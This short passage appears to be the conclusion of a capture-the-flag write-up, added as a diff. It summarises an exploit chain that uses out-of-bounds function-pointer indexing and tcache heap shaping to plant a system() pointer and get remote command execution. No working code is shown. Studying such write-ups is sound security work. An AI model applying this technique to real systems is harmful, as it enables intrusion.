+Out-of-bounds algorithm indexing, letting the attacker treat heap data as function pointers.
+
+Predictable heap allocation (tcache), allowing precise placement of attacker-controlled payloads after the algorithm table.
+
+By shaping the heap, embedding a system() pointer, and supplying a command string that redirected output to our socket, we achieved RCE and read the flag file.
+In short: weak crypto framing, unchecked lengths, and unsafe function-pointer indexing combined into a clean and stable attack chain—from key leakage to full remote command execution.
+
+```
+```
